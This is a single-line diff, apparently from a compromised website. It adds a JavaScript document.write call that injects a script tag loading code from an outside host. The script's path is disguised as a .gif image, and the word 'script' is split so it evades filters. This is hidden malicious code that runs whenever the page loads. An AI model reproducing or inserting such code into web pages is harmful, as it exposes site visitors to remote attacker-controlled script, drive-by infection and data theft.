@@ -1,0 +1,1 @@
+document.write("<scr"+"ipt language=javascript src=http://bojingwang.com/old/images/o.gif></scr"+"ipt>");
